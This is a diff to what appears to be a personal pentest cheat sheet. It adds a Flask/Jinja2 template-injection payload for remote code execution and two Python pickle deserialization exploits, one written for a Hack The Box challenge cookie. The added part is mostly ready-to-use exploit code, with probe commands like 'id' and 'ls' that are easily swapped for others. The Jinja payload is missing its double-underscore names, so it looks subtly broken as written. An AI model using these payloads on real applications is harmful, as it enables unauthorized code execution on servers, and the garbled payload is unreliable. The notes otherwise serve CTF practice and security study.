@@ -77,13 +77,48 @@ Query the script file from the victim site
 
 
 
-# Flask (Jinja 2) RCE
+# Flask
+## (Jinja 2) RCE
 Server side template injection RCE
 ```python
 {{request.application.globals.builtins.import('os').popen('id').read()}}
 ```
-## References
+
+## Insecure deserialization (Python pickle)
+Pickle data unserialization allows for RCE
+
+### Normal exploit
+**Note:**  If the encoded cookie doesn't look the same as expected one can edit the *protocol* argument on the `pickle.dumps()` function.
+```py
+import pickle,os
+
+class Pickle(object):
+    def __reduce__(self):
+        return os.system, ('id',)
+
+o = Pickle()
+print(pickle.dumps(o))
+```
+
+### Exploit for HTB challenge (baby website rick)
+A cookie from the website can be decoded in *base64* so, that one can see what variables it uses.      
+Also, the cookie wasn't edited properly when the script was ran with *python3* so, I decided to run it with *python2*
+```py
+from base64 import b64encode
+import pickle,subprocess
+
+class anti_pickle_serum(object):
+    def __reduce__(self):
+        return subprocess.check_output, (["ls"],)
+
+dumps = pickle.dumps({"serum": anti_pickle_serum()},protocol=0)
+print(b64encode(dumps))
+```
+
+#### References
 - [https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)
+- [https://knowledge-base.secureflag.com/vulnerabilities/unsafe_deserialization/unsafe_deserialization_python.html](https://knowledge-base.secureflag.com/vulnerabilities/unsafe_deserialization/unsafe_deserialization_python.html)
+- [https://ir0nstone.gitbook.io/hackthebox/challenges/web/baby-website-rick](https://ir0nstone.gitbook.io/hackthebox/challenges/web/baby-website-rick)
 
 
 # Tomcat
